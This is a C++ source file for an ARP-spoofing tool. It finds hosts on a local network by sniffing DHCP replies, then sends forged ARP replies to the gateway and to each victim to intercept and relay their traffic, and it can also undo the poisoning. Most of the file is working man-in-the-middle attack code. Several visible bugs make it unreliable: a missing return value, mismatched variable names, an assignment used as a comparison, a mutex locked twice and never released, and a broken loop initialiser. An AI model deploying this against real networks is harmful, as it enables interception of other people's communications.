#include "arpspoof.h"
bool ArpSpoof::doOpen() {
    intf_ = NetInfo::instance().intfList().findByName(intfName_);
    gwIp_ = intf()->gateway();

    myIp_ = intf_->ip();
    myMac_ = intf_->mac();

    bool res = PcapDevice::doOpen();
    if (!res) return false;

    //find gateway mac
    sendQuery(gwIp_);
    while (true) {
        EthPacket packet;
        Packet::Result res = read(&packet);
        if (res == Packet::Eof) {
            break;
        } else
        if (res == Packet::Fail) {
            break;
        } else
        if (res == Packet::None) {
            continue;
        }

        ArpHdr* arpHdr = packet.arpHdr_;
        if (arpHdr == nullptr) continue;
        if (arpHdr->op() != ArpHdr::Reply) continue;

        Ip sip = arpHdr->sip();
        Mac smac = arpHdr->smac();

        if (sip == gwIp_) {
            gwMac_ = smac;
            break;
        }
    }

}
//not need to cp
/*
void ArpSpoof::hostScan() {
    Ip begIp = (myIp_ & intf_->mask()) + 1;
    Ip endIp = (myIp_ | ~intf_->mask());

    EthArpPacket packet;

    EthHdr* ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::broadcastMac();
    ethHdr->smac_ = myMac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr* arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Request);
    arpHdr->smac_ = myMac_;
    arpHdr->sip_ = htonl(myIp_);
    arpHdr->tmac_ = Mac::nullMac();

    while (active()) {
        for (Ip ip = begIp; ip <= endIp; ip = ip + 1) {
            arpHdr->tip_ = htonl(ip);
            if (!active() || !device_->active()) break;
            Packet::Result res = device_->write(Buf(pbyte(&packet), sizeof(packet)));
            if (res != Packet::Ok) {
                break;
            }
            if (we_.wait(sendSleepTime_)) break;
        }
        if (!active() || !pcapDevice_->active()) break;
        if (we_.wait(rescanSleepTime_)) break;
    }

}*/

bool ArpSpoof::processDhcp(Packet* packet, Mac* mac, Ip* ip) {
    UdpHdr* udpHdr = packet->udpHdr_;
    if (udpHdr == nullptr) return false;

    if (!(udpHdr->sport() == 67 || udpHdr->dport() == 67)) return false;

    Buf dhcp = packet->udpData_;
    if (dhcp.data_ == nullptr) return false;
    if (dhcp.size_ < sizeof(DhcpHdr)) return false;

    DhcpHdr* dhcpHdr = PDhcpHdr(dhcp.data_);

    bool ok = false;
    if (dhcpHdr->yourIp() != 0) { // DHCP Offer of DHCP ACK sent from server
        *mac = dhcpHdr->clientMac();
        *ip = dhcpHdr->yourIp();
        ok = true;
    }

    return ok;
}

void ArpSpoof::detect(Packet* packet) {
    Mac mac;
    Ip ip;
    std::string hostName;

    EthHdr* ethHdr = packet->ethHdr_;
    if (ethHdr == nullptr) return;

    mac = ethHdr->smac();
    if (mac == myMac_) return;

    bool detected = false;
    IpHdr* ipHdr = packet->ipHdr_;
    if (ipHdr != nullptr && ipHdr->sip() != myIp_) {
        if (processDhcp(packet, &mac, &ip))
            detected = true;
    }

    if (!detected) return;

    Flow host(mac, ip);
    struct timeval now;
    gettimeofday(&now, NULL);
    host.lastAccess_ = now;

    spdlog::info(" "+ std::string(mac) + " " + std::string(ip));
    flowList_.push_back(host);
}

bool ArpSpoof::sendArpInfectAll() {
    flowList_.m_.lock();
    for (Flow& flow: flowList_) {
        if (!sendInfect(flow))
            return false;
        std::this_thread::sleep_for(std::chrono::seconds(sendInterval_));
    }
    return true;
}

bool ArpSpoof::sendQuery(Ip tip) {
    EthArpPacket query;
    query.ethHdr_.dmac_ = Mac::broadcastMac();
    query.ethHdr_.smac_ = intf_->mac();
    query.ethHdr_.type_ = htons(EthHdr::Arp);

    query.arpHdr_.hrd_ = htons(ArpHdr::ETHER);
    query.arpHdr_.pro_ = htons(EthHdr::Ip4);
    query.arpHdr_.hln_ = sizeof(Mac);
    query.arpHdr_.pln_ = sizeof(Ip);
    query.arpHdr_.op_ = htons(ArpHdr::Request);
    query.arpHdr_.smac_ = intf_->mac();
    query.arpHdr_.sip_ = htonl(intf_->ip());
    query.arpHdr_.tip_ = htonl(tip);
    query.arpHdr_.tmac_ = Mac::nullMac();
    Buf queryBuf(pbyte(&query), sizeof(query));

    Packet::Result res = write(queryBuf);
    if (res != Packet::Ok) {
        return false;
    }
    return true;
}

bool ArpSpoof::sendInfect(Flow flow)
{
    spdlog::info(string(flow.ip_));
    EthArpPacket packet;

    EthHdr *ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::nullMac();
    ethHdr->smac_ = intf_->mac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr *arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Reply);
    arpHdr->smac_ = intf_->mac_;
    arpHdr->tmac_ = Mac::nullMac();

    //  gateway send
    ethHdr->dmac_ = gatewayMac_;
    arpHdr->sip_ = htonl(flow.ip_);
    arpHdr->tmac_ = gatewayMac_;
    arpHdr->tip_ = htonl(intf_->gateway());
    device_->write(Buf(pbyte(&packet), sizeof(packet)));

    //  target send
    ethHdr->dmac_ = flow.mac_;
    arpHdr->sip_ = htonl(intf_->gateway());
    arpHdr->tmac_ = flow.mac_;
    arpHdr->tip_ = htonl(flow.ip_);
    Packet::Result res = device_->write(Buf(pbyte(&packet), sizeof(packet)));
    return res = Packet::Ok;
}

void ArpSpoof::sendRecover(Flow flow)
{
    spdlog::info(std::string(flow.ip_));
    EthArpPacket packet;

    EthHdr *ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::nullMac();
    ethHdr->smac_ = intf_->mac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr *arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Reply);
    arpHdr->smac_ = Mac::nullMac();
    arpHdr->tmac_ = Mac::nullMac();

    //  gateway send
    ethHdr->dmac_ = gatewayMac_;
    arpHdr->smac_ = flow.mac_;
    arpHdr->sip_ = htonl(flow.ip_);
    arpHdr->tmac_ = gatewayMac_;
    arpHdr->tip_ = htonl(intf_->gateway());
    device_->write(Buf(pbyte(&packet), sizeof(packet)));

    //  target send
    ethHdr->dmac_ = flow.mac_;
    arpHdr->smac_ = gatewayMac_;
    arpHdr->sip_ = htonl(intf_->gateway());
    arpHdr->tmac_ = flow.mac_;
    arpHdr->tip_ = htonl(flow.ip_);
    device_->write(Buf(pbyte(&packet), sizeof(packet)));
}

Packet::Result ArpSpoof::relay(Packet* packet) {
    packet->ethHdr_->smac_ = intf_->mac_;
    return write(packet);
}

void ArpSpoof::removeFlows(Flow sender) { //sender == not gateway
    {
        flowList_.m_.lock();
        sendRecover(sender);
        flowList_.m_.lock();
        std::list<Flow>::iterator iter;
        for(iter == flowList_.begin(); iter!= flowList_.end(); iter++){
            if(iter->ip_ == sender.ip_){
                flowList_.erase(iter);
                break;
            }
        }
    }
}
